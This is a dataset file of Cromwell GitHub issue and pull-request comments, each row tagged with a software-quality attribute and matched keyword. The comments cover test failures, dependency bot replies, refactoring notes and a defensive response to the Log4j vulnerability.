centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:565,Testability,Test,Test,565,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:705,Testability,test,test,705,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:877,Testability,test,test,877,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:954,Testability,test,test,954,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:997,Testability,Test,Test,997,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:1026,Testability,test,test,1026,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:1077,Testability,Test,Test,1077,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6581#issuecomment-983736653:374,Modifiability,extend,extend,374,"I had the same thought as @breilly2 - we have other classes and traits used in a standard way that people building new backends should consider using. I don't think it makes sense to fully document them here, but it might be helpful to add a note indicating that this universe exists and people may want to explore it. Something like, ""Cromwell has a number of classes that extend these traits and implement common backend patterns, which developers may find useful. For example, see...""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6581#issuecomment-983736653
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211:38,Deployability,configurat,configurations,38,Cromwell may be vulnerable in certain configurations. This is being looked into. We recommend the immediate remedy of disabling the vulerable feature of Log4j:; ```; ‐Dlog4j2.formatMsgNoLookups=True; ```; [Source.](https://logging.apache.org/log4j/2.x/),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211:38,Modifiability,config,configurations,38,Cromwell may be vulnerable in certain configurations. This is being looked into. We recommend the immediate remedy of disabling the vulerable feature of Log4j:; ```; ‐Dlog4j2.formatMsgNoLookups=True; ```; [Source.](https://logging.apache.org/log4j/2.x/),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211:223,Testability,log,logging,223,Cromwell may be vulnerable in certain configurations. This is being looked into. We recommend the immediate remedy of disabling the vulerable feature of Log4j:; ```; ‐Dlog4j2.formatMsgNoLookups=True; ```; [Source.](https://logging.apache.org/log4j/2.x/),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-994127087:429,Deployability,update,updated,429,"Cromwell itself does not use Log4j. This can be verified by executing `sbt dependencyTree` and noting that all instances of ""log4j"" occur in `org.slf4j:log4j-over-slf4j` which is a Log4j [compatibility bridge from a different project](http://www.slf4j.org/legacy.html#log4j-over-slf4j). The utility tool `CromwellRefdiskManifestCreator` is written in Java and does use Log4j. It is not included in the Cromwell JAR. It is [being updated](https://github.com/broadinstitute/cromwell/pull/6593) presently.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-994127087
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-994127087:75,Integrability,depend,dependencyTree,75,"Cromwell itself does not use Log4j. This can be verified by executing `sbt dependencyTree` and noting that all instances of ""log4j"" occur in `org.slf4j:log4j-over-slf4j` which is a Log4j [compatibility bridge from a different project](http://www.slf4j.org/legacy.html#log4j-over-slf4j). The utility tool `CromwellRefdiskManifestCreator` is written in Java and does use Log4j. It is not included in the Cromwell JAR. It is [being updated](https://github.com/broadinstitute/cromwell/pull/6593) presently.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-994127087
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-994127087:202,Integrability,bridg,bridge,202,"Cromwell itself does not use Log4j. This can be verified by executing `sbt dependencyTree` and noting that all instances of ""log4j"" occur in `org.slf4j:log4j-over-slf4j` which is a Log4j [compatibility bridge from a different project](http://www.slf4j.org/legacy.html#log4j-over-slf4j). The utility tool `CromwellRefdiskManifestCreator` is written in Java and does use Log4j. It is not included in the Cromwell JAR. It is [being updated](https://github.com/broadinstitute/cromwell/pull/6593) presently.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-994127087
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802:3,Availability,redundant,redundantly,3,We redundantly re-verified the absence of the problem class [0] by [unzipping](https://docs.oracle.com/javase/tutorial/deployment/jar/unpack.html) the shipping Cromwell JAR and manually checking that the path is empty. [0] `org/apache/logging/log4j/core/lookup/JndiLookup.class`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802:119,Deployability,deploy,deployment,119,We redundantly re-verified the absence of the problem class [0] by [unzipping](https://docs.oracle.com/javase/tutorial/deployment/jar/unpack.html) the shipping Cromwell JAR and manually checking that the path is empty. [0] `org/apache/logging/log4j/core/lookup/JndiLookup.class`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802:3,Safety,redund,redundantly,3,We redundantly re-verified the absence of the problem class [0] by [unzipping](https://docs.oracle.com/javase/tutorial/deployment/jar/unpack.html) the shipping Cromwell JAR and manually checking that the path is empty. [0] `org/apache/logging/log4j/core/lookup/JndiLookup.class`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802
https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802:235,Testability,log,logging,235,We redundantly re-verified the absence of the problem class [0] by [unzipping](https://docs.oracle.com/javase/tutorial/deployment/jar/unpack.html) the shipping Cromwell JAR and manually checking that the path is empty. [0] `org/apache/logging/log4j/core/lookup/JndiLookup.class`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802
https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-994016118:4,Deployability,update,updates,4,doc updates forthcoming,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-994016118
https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-994110935:21,Modifiability,parameteriz,parameterized,21,"@cjllanwarne this is parameterized, the `JobExecutionTokenDispenserActor` has become `JobTokenDispenserActor` and has [additional constructor parameters](https://github.com/broadinstitute/cromwell/blob/ad1249679a28c297fc1e075b69d2d69619e3b837/engine/src/main/scala/cromwell/engine/workflow/tokens/JobTokenDispenserActor.scala#L27-L28) that allow it to be more generic than before. [Two different instances](https://github.com/broadinstitute/cromwell/blob/ad1249679a28c297fc1e075b69d2d69619e3b837/engine/src/main/scala/cromwell/server/CromwellRootActor.scala#L162-L163) of this same class are created in `CromwellRootActor`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-994110935
https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-1004833002:79,Testability,log,logging,79,@cjllanwarne I got rid of the separate boolean and tried to make restart token logging work like execution token logging.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-1004833002
https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-1004833002:113,Testability,log,logging,113,@cjllanwarne I got rid of the separate boolean and tried to make restart token logging work like execution token logging.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6590#issuecomment-1004833002
https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172:93,Availability,avail,available,93,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172
https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172:40,Deployability,release,release,40,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172
https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172:129,Deployability,update,updates,129,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172
https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172:204,Integrability,depend,dependabot,204,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172
https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172:247,Integrability,depend,dependabot,247,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6591#issuecomment-995908172
https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676:93,Availability,avail,available,93,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676
https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676:40,Deployability,release,release,40,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676
https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676:129,Deployability,update,updates,129,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676
https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676:204,Integrability,depend,dependabot,204,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676
https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676:247,Integrability,depend,dependabot,247,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6592#issuecomment-995908676
https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124:93,Availability,avail,available,93,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124
https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124:40,Deployability,release,release,40,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124
https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124:129,Deployability,update,updates,129,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124
https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124:204,Integrability,depend,dependabot,204,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124
https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124:247,Integrability,depend,dependabot,247,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6594#issuecomment-998399124
https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013:93,Availability,avail,available,93,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013
https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013:40,Deployability,release,release,40,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013
https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013:129,Deployability,update,updates,129,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013
https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013:204,Integrability,depend,dependabot,204,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013
https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013:247,Integrability,depend,dependabot,247,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6595#issuecomment-998399013
https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032:64,Safety,avoid,avoid,64,"There are a few follow ups that I will make new tickets for, to avoid delaying the merge on this PR:. 1. Renaming the method to processEventsAndEmitWarnings would make it more clear what's going on; 2. Accounting for metadata generated at the parent or root workflows level separately from contributions from their subworkflows",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032
https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032:176,Usability,clear,clear,176,"There are a few follow ups that I will make new tickets for, to avoid delaying the merge on this PR:. 1. Renaming the method to processEventsAndEmitWarnings would make it more clear what's going on; 2. Accounting for metadata generated at the parent or root workflows level separately from contributions from their subworkflows",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032
https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1010387159:359,Availability,error,errors,359,StatsDProxy was deleted in these changes. StatsDProxy was an old UDP packet tee for the Cromwell perf environment we no longer use. It was written against version 1 of [fs2](https://fs2.io/#/) which unfortunately introduced all kinds of horrible conflicts at assembly time with the updated http4s fs2 version 2 dependencies (see CROM-6858 for sample assembly errors).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1010387159
https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1010387159:282,Deployability,update,updated,282,StatsDProxy was deleted in these changes. StatsDProxy was an old UDP packet tee for the Cromwell perf environment we no longer use. It was written against version 1 of [fs2](https://fs2.io/#/) which unfortunately introduced all kinds of horrible conflicts at assembly time with the updated http4s fs2 version 2 dependencies (see CROM-6858 for sample assembly errors).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1010387159
https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1010387159:311,Integrability,depend,dependencies,311,StatsDProxy was deleted in these changes. StatsDProxy was an old UDP packet tee for the Cromwell perf environment we no longer use. It was written against version 1 of [fs2](https://fs2.io/#/) which unfortunately introduced all kinds of horrible conflicts at assembly time with the updated http4s fs2 version 2 dependencies (see CROM-6858 for sample assembly errors).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1010387159
